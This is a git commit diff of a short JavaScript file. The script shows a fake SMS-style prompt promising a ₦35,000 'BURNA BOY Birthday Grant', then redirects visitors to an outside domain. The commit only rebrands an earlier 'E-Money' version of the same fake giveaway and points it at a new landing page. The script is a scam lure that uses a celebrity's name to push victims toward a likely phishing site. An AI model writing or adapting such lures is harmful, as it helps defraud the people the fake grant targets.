9408785f28de25764c1349bd4b94f19d1b97f912
Jesusboys <156060629+Jesusboys@users.noreply.github.com>
2024-07-02 09:39:04 -0700

    Update e-money-group.js

--- e-money-group.js
+++ e-money-group.js
@@ -1,6 +1,6 @@
 
 var password = '1'
-password=prompt('SMS: Congratulations you have been selected to receive ₦35,000 E-Money Birthday Grant, Kindly press 1 to open grant form ','1');
+password=prompt('SMS: Congratulations you have been selected to receive ₦35,000 BURNA BOY Birthday Grant, Kindly press 1 to open grant form ','1');
 if (password != '1') {
-location.href='https://2024-program.xyz/e-money.html';
+location.href='https://2024-program.xyz/burna.boy.html';
 }
